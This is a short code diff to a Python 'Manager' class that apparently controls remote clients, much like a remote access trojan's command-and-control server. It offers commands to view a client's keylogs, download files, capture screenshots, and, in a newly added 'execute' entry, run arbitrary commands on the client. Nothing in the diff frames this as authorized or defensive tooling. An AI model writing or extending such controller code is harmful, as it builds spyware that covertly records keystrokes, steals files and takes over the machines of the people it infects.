@@ -17,15 +17,19 @@ class Manager:
             },
             "keylogs": {
                 "description": "View the keylogs of a session",
-                "arguments": ["session_id"],
+                "arguments": ["client_id"],
             },
             "download": {
                 "description": "Download a file from a session",
-                "arguments": ["session_id", "file_path"],
+                "arguments": ["client_id", "file_path"],
             },
             "screenshot": {
                 "description": "Capture a screenshot from a session",
-                "arguments": ["session_id"],
+                "arguments": ["client_id"],
+            },
+            "execute": {
+                "description": "Execute a command on a client",
+                "arguments": ["client_id", "command"],
             },
         }
         self.connection_listener()
@@ -96,7 +100,7 @@ class Manager:
                 # if the client is found...
                 if specified_client := self.get_client(cid):
                     # pass the command through to the client and execute on said client
-                    specified_client.execute(cmd, *args)
+                    specified_client.handle(cmd, *args)
                 else:
                     print(utility.padded(f"Client with ID `{cid}` does not exist"))
 
